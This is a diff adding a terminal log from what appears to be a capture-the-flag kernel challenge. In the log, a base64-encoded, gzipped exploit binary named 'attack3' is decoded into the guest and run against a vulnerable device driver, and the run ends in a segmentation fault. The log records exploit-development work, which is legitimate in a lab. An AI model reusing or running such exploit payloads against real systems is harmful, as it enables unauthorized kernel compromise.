@@ -1,0 +1,30 @@
+[    3.969805] 9pnet_virtio: no channels available for device hostshare
+mount: mounting hostshare on /home/ctf failed: No such file or directory
+[    4.015623] Module successfuly initialized
+-sh: can't access tty; job control turned off
+~ $ base64 -d | gunzip > attack3
+H4sIAHbhk2EA/+2az2sTTRjHp036Q0HSgoe+KPSHBotIQvFSsUgvahTPXodJdtIsTbLL7Naaw+sv
+EJQqeHsPgngU/AdChTQ3UfCiF28e9FC8SA+Kt3R+PE86u216kvfifCA783yfeWYmk83CPDt3L9+4
+Mjw0RJBhcoloa2JZ2+ZKyMzpfhOpLZKMvI6RUd02u+eyIky5DRaWZMIUKm7EsnE8LEOYEpZ23Kie
+EE4M4qCcxtGHk3EOh8PhcDgcDofD4XD8zbTVPrm0hdvnjjJzI6WH3dyjs3KvXXqczc9IX1tto0sb
+S9roqL335rokN7LQRbXUmYdONpdlpOxkI5t/pRyyj+1ZWW4cz7eV/fTBu6Om699KfpvNkzkTKV3v
+wTUuJWm2XnzrKXPCmBg4lTTnk+aiNNsqU7A3t5ocSc/ts/mCOBfZWg0ugy883xvp8OD2Rb1mk/B1
+F34tfJSiCtnScZ1/cCFUpkK6ltCV0ykPh8PhcDgcDofD4XA4/m+KoQgqxXC9ST1+y69wUiz7zWJU
+I1yIQMj99CFk1Nt4fG+f0GUWAd/LJ/QMURtqG3N+YKeXbntMX3d69+5sb/YkqJv3+zu97v2kvgj6
+1a+ZN7Z+HXSVkrC5if2nxvVBf5bS/wVdpRhsnoCu0hY2/w3o//WA/rugqwyDzQdYpWuTyXX7BKc1
+0uv8BXRMTiDfQcfUBPIT9OmUntXrtf/3GgMdcz39Yx2gY6oEmVW3yAH3yUmtZ/aNO6/1/fNRP6hq
+vwyZoj4sjlll9XyBRQ1SCRoNP6YVwb2IMs8TJBQ8ZILTVS6avK49xhEJzjwqeLwmmkbRAmsEa83Y
+1CusyUSLBtVqxEGS7VVb1FaYt8JjGgYhFZ6PpmxE1oUf81QPRkt1YUQYVv/niPkj0qpf5ySq8Xrd
+VLWTxvw2tNNVypseqXpmduW1KglZqx5AndJyFNEoZiImlHssZoQUolYjZmVZxsKUNazprgu6WUEG
+/pnnywn7zE7inE/qfM+A4zqzEJ9BoX/ex34eWPdtyj4jP+NWPN7P0xA/g+eEBsSrsVNNoB9TvgSn
+SuxNwVgKVVccsedu/9/n4Pmb+v4pk0wOiP9xypTnDpivzS7Y7quT4CUAAA==
+~ $ chmod +x attack3
+~ $ ./attack3
+[   21.842960] Device opened
+[   21.847921] IOCTL Called
+[   21.851508] 320 bytes read from device
+[   21.856820] 216 bytes written to device
+[   21.862019] 216 bytes written to device
+[   21.874188] All device's closed
+Segmentation fault
+~ $
